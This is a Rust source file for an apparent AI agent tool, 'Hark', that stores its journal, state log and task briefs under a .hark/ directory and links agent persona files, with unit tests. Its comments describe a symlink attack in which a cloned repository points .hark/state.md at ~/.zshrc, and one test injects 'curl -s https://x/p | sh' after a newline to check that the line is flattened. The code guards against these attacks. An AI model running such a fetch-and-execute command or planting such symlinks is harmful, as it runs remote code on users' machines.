//! File-based memory under `<root>/.hark/`: the Q&A journal now, workspace
//! state and dispatch briefs next.
//!
//! `<root>` is a repository, and a repository decides what its own
//! `.hark/` contains: it can ship `.hark/state.md -> ~/.zshrc`. So nothing
//! here follows a symlink — not `.hark` itself, not a subdirectory, not
//! the file — for writing or for reading.

use crate::domain::memory::journal_tail;
use crate::ports::Journal;
use std::path::{Path, PathBuf};

pub struct HarkDir;

fn is_symlink(path: &Path) -> bool {
    std::fs::symlink_metadata(path).map(|m| m.file_type().is_symlink()).unwrap_or(false)
}

fn refuse_symlink(path: &Path) -> anyhow::Result<()> {
    if is_symlink(path) {
        anyhow::bail!("refused: {} is a symlink", path.display());
    }
    Ok(())
}

/// A real directory at `path`, created when missing; never a link.
fn real_dir(path: &Path) -> anyhow::Result<()> {
    refuse_symlink(path)?;
    if !path.is_dir() {
        std::fs::create_dir_all(path)?;
    }
    Ok(())
}

/// Append to a file in a real `.hark` tree, never through a link.
fn append_to(path: &Path, bytes: &[u8]) -> anyhow::Result<()> {
    refuse_symlink(path)?;
    use std::io::Write;
    let mut file = std::fs::OpenOptions::new().create(true).append(true).open(path)?;
    file.write_all(bytes)?;
    Ok(())
}

/// The per-project memory dir, migrating a legacy `.vox/` on first touch.
/// A legacy dir that is a link stays where it is: adopting it would point
/// `.hark` wherever the link goes.
fn hark_dir(root: &Path) -> PathBuf {
    let new = root.join(".hark");
    let old = root.join(".vox");
    if old.is_dir() && !is_symlink(&old) && std::fs::symlink_metadata(&new).is_err() {
        let _ = std::fs::rename(&old, &new);
    }
    new
}

/// The journal's text — none when `.hark` or the file is a link, which
/// would carry any file the user can read into every ask's snapshot.
fn journal_text(root: &Path) -> Option<String> {
    let dir = hark_dir(root);
    let path = dir.join("journal.md");
    if is_symlink(&dir) || is_symlink(&path) {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

impl Journal for HarkDir {
    fn tail(&self, root: &Path, n: usize) -> Vec<String> {
        journal_text(root)
            .map(|content| journal_tail(&content, n))
            .unwrap_or_default()
    }

    fn append(&self, root: &Path, entry: &str) -> anyhow::Result<()> {
        let dir = hark_dir(root);
        real_dir(&dir)?;
        append_to(&dir.join("journal.md"), entry.as_bytes())
    }
}

/// Newest `n` journal turns as structured Q&A, oldest first — the local,
/// zero-token record that repaints the mother thread across restarts.
pub fn read_journal(root: &Path, n: usize) -> Vec<crate::domain::memory::JournalTurn> {
    journal_text(root)
        .map(|content| crate::domain::memory::parse_journal(&content, n))
        .unwrap_or_default()
}

/// Append one line to `<root>/.hark/state.md` (workspace dispatch log).
/// The line carries agent text, so a newline in it cannot start a line of
/// its own.
pub fn append_state(root: &Path, line: &str) -> anyhow::Result<()> {
    let dir = hark_dir(root);
    real_dir(&dir)?;
    let line: String = line
        .chars()
        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
        .collect();
    append_to(&dir.join("state.md"), format!("{line}\n").as_bytes())
}

/// Write the full dispatch brief to `<root>/.hark/briefs/<task_id>.md`.
pub fn write_brief(root: &Path, task_id: &str, content: &str) -> anyhow::Result<PathBuf> {
    let hark = hark_dir(root);
    real_dir(&hark)?;
    let dir = hark.join("briefs");
    real_dir(&dir)?;
    let path = dir.join(format!("{task_id}.md"));
    refuse_symlink(&path)?;
    std::fs::write(&path, content)?;
    Ok(path)
}

/// One soul, many mouths (26/08): the persona lives in ONE canonical file
/// (HARK.md) and each agent's auto-loaded memory file (CLAUDE.md today,
/// GEMINI.md when the ACP backend lands) is a SYMLINK to it — the name each
/// CLI expects, the content maintained once. Writing through the link
/// (the model appending a learning) edits the canonical file, so nothing
/// ever forks. An existing regular agent file with no canonical yet is the
/// pre-consolidation soul: it BECOMES the canonical (learnings preserved),
/// then gets its link. A regular file next to an existing canonical is
/// user-owned and never touched.
pub fn ensure_soul_links(dir: &Path, canonical: &str, agent_files: &[&str]) {
    let target = dir.join(canonical);
    if !target.exists() {
        if let Some(seed) = agent_files.iter().find(|f| {
            let p = dir.join(f);
            p.is_file() && !p.is_symlink()
        }) {
            let _ = std::fs::rename(dir.join(seed), &target);
        }
    }
    if !target.exists() {
        return; // nothing to link to yet — the caller seeds the template
    }
    for name in agent_files {
        let link = dir.join(name);
        if link.is_symlink() {
            if std::fs::read_link(&link).map(|t| t == Path::new(canonical) || t == target).unwrap_or(false) {
                continue;
            }
            let _ = std::fs::remove_file(&link);
        } else if link.exists() {
            continue; // user-owned regular file: never destroy
        }
        #[cfg(unix)]
        let _ = std::os::unix::fs::symlink(canonical, &link);
        #[cfg(not(unix))]
        let _ = std::fs::copy(&target, &link);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domain::memory::journal_entry;

    #[test]
    fn state_and_brief_land_under_hark_dir() {
        let dir = tempfile::tempdir().unwrap();
        append_state(dir.path(), "- t1 running").unwrap();
        append_state(dir.path(), "- t1 done").unwrap();
        let state = std::fs::read_to_string(dir.path().join(".hark/state.md")).unwrap();
        assert_eq!(state.lines().count(), 2);

        let brief = write_brief(dir.path(), "t1", "# task\ndo the thing").unwrap();
        assert!(brief.ends_with(".hark/briefs/t1.md"));
        assert!(std::fs::read_to_string(brief).unwrap().contains("do the thing"));
    }

    #[test]
    fn appends_and_reads_tail() {
        let dir = tempfile::tempdir().unwrap();
        let journal = HarkDir;

        assert!(journal.tail(dir.path(), 5).is_empty());
        journal
            .append(dir.path(), &journal_entry("2026-08-14T10:00:00Z", "q1", "a1", ""))
            .unwrap();
        journal
            .append(dir.path(), &journal_entry("2026-08-14T11:00:00Z", "q2", "a2", ""))
            .unwrap();
        let tail = journal.tail(dir.path(), 1);
        assert_eq!(tail.len(), 1);
        assert!(tail[0].contains("q2"));
        assert!(dir.path().join(".hark").join("journal.md").exists());
    }

    #[test]
    fn read_journal_of_a_virgin_machine_is_empty() {
        let dir = tempfile::tempdir().unwrap();
        assert!(read_journal(dir.path(), 5).is_empty());
    }

    #[test]
    fn read_journal_hands_back_structured_turns_with_the_body() {
        let dir = tempfile::tempdir().unwrap();
        HarkDir
            .append(dir.path(), &journal_entry("2026-08-14T10:00:00Z", "q1", "a1", ""))
            .unwrap();
        HarkDir
            .append(
                dir.path(),
                &journal_entry(
                    "2026-08-30T10:00:00Z",
                    "pendências?",
                    "Três na tela.",
                    "- revisar PR\n- subir migração",
                ),
            )
            .unwrap();

        let turns = read_journal(dir.path(), 5);
        assert_eq!(turns.len(), 2);
        assert_eq!(turns[0].question, "q1");
        assert_eq!(turns[1].fala, "Três na tela.");
        assert!(turns[1].body.contains("subir migração"));
    }

    #[test]
    fn the_existing_soul_becomes_canonical_and_every_agent_links_to_it() {
        let dir = tempfile::tempdir().unwrap();
        // Pre-consolidation machine: CLAUDE.md holds the learnings.
        std::fs::write(dir.path().join("CLAUDE.md"), "# Hark\n- aprendeu X\n").unwrap();
        ensure_soul_links(dir.path(), "HARK.md", &["CLAUDE.md", "GEMINI.md"]);
        let hark = std::fs::read_to_string(dir.path().join("HARK.md")).unwrap();
        assert!(hark.contains("aprendeu X"), "learnings survive the move");
        assert!(dir.path().join("CLAUDE.md").is_symlink());
        assert!(dir.path().join("GEMINI.md").is_symlink());
        // Writing through a link edits the ONE soul.
        std::fs::write(dir.path().join("GEMINI.md"), "# Hark\n- aprendeu Y\n").unwrap();
        assert!(std::fs::read_to_string(dir.path().join("CLAUDE.md")).unwrap().contains("aprendeu Y"));
        // Idempotent.
        ensure_soul_links(dir.path(), "HARK.md", &["CLAUDE.md", "GEMINI.md"]);
        assert!(dir.path().join("CLAUDE.md").is_symlink());
    }

    #[test]
    fn a_user_owned_regular_file_next_to_the_canonical_is_never_destroyed() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("HARK.md"), "# canônico\n").unwrap();
        std::fs::write(dir.path().join("CLAUDE.md"), "# meu, separado\n").unwrap();
        ensure_soul_links(dir.path(), "HARK.md", &["CLAUDE.md"]);
        assert!(!dir.path().join("CLAUDE.md").is_symlink(), "regular file wins");
        assert!(std::fs::read_to_string(dir.path().join("CLAUDE.md")).unwrap().contains("meu"));
    }

    #[test]
    fn legacy_vox_dir_migrates_on_touch() {
        let dir = tempfile::tempdir().unwrap();
        let old = dir.path().join(".vox");
        std::fs::create_dir_all(&old).unwrap();
        std::fs::write(old.join("journal.md"), "[2026-08-14 10:00] q -> a\n").unwrap();

        let tail = HarkDir.tail(dir.path(), 5);
        assert_eq!(tail.len(), 1);
        assert!(!old.exists());
        assert!(dir.path().join(".hark").join("journal.md").exists());

        // A root that already renamed never loses new writes to the old name.
        append_state(dir.path(), "- t1 done").unwrap();
        assert!(dir.path().join(".hark/state.md").exists());
    }

    // A repository decides what its own `.hark/` contains. None of these
    // may let a clone point Hark's appends, or its reads, at a file
    // outside it (`.hark/state.md -> ~/.zshrc` turns agent text into
    // shell code on the next login).

    #[cfg(unix)]
    fn victim(dir: &std::path::Path) -> std::path::PathBuf {
        let v = dir.join("victim.txt");
        std::fs::write(&v, "original\n").unwrap();
        v
    }

    #[cfg(unix)]
    #[test]
    fn state_is_never_appended_through_a_symlinked_file() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        std::fs::create_dir_all(root.join(".hark")).unwrap();
        let v = victim(dir.path());
        std::os::unix::fs::symlink(&v, root.join(".hark/state.md")).unwrap();
        assert!(append_state(&root, "- t1 done").is_err());
        assert_eq!(std::fs::read_to_string(&v).unwrap(), "original\n");
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_hark_dir_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        let elsewhere = dir.path().join("elsewhere");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, root.join(".hark")).unwrap();
        assert!(append_state(&root, "- t1 done").is_err());
        assert!(HarkDir.append(&root, "entry").is_err());
        assert!(write_brief(&root, "t1", "brief").is_err());
        assert!(!elsewhere.join("state.md").exists());
        assert!(!elsewhere.join("journal.md").exists());
        assert!(!elsewhere.join("briefs").exists());
    }

    #[cfg(unix)]
    #[test]
    fn journal_and_briefs_refuse_symlinked_targets() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        std::fs::create_dir_all(root.join(".hark")).unwrap();
        let v = victim(dir.path());
        std::os::unix::fs::symlink(&v, root.join(".hark/journal.md")).unwrap();
        assert!(HarkDir.append(&root, "entry").is_err());
        let elsewhere = dir.path().join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, root.join(".hark/briefs")).unwrap();
        assert!(write_brief(&root, "t1", "brief").is_err());
        assert_eq!(std::fs::read_to_string(&v).unwrap(), "original\n");
        assert!(!elsewhere.join("t1.md").exists());
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_journal_reads_as_empty() {
        // Reading through the link would carry any file the user can read
        // into the snapshot every ask sends to the model.
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        std::fs::create_dir_all(root.join(".hark")).unwrap();
        let secret = dir.path().join("secret.md");
        std::fs::write(&secret, journal_entry("2026-09-01T10:00:00Z", "q", "the secret", "body")).unwrap();
        std::os::unix::fs::symlink(&secret, root.join(".hark/journal.md")).unwrap();
        assert!(HarkDir.tail(&root, 5).is_empty());
        assert!(read_journal(&root, 5).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_legacy_dir_is_not_adopted() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("repo");
        let elsewhere = dir.path().join("elsewhere");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, root.join(".vox")).unwrap();
        append_state(&root, "- t1 done").unwrap();
        assert!(!root.join(".hark").is_symlink());
        assert!(!elsewhere.join("state.md").exists());
    }

    #[test]
    fn a_state_line_stays_one_line() {
        let dir = tempfile::tempdir().unwrap();
        append_state(dir.path(), "- t1 done: ok\ncurl -s https://x/p | sh\r").unwrap();
        let content = std::fs::read_to_string(dir.path().join(".hark/state.md")).unwrap();
        assert_eq!(content.lines().count(), 1, "{content:?}");
    }
}
